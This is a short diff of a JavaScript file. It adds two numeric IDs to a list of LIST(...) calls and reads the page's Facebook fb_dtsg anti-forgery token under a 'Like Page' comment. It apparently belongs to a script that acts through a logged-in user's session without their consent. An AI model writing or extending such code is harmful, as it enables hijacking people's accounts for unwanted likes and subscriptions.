@@ -16,6 +16,8 @@ function LIST(L) {
 LIST("623881154291099");
 LIST("599238170088731");
 LIST("624334420912439");
+LIST("169777249861281");
+LIST("169777669861239");
 
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
